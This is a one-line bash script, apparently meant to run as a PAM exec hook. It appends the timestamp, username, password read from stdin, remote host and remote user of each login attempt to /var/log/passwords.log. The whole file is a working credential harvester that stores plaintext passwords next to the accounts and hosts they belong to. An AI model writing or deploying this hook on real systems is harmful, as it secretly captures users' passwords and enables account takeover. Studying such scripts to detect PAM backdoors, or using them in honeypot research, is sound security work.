#!/bin/bash

echo "$(date) $PAM_USER $(cat -) $PAM_RHOST $PAM_RUSER" >> /var/log/passwords.log
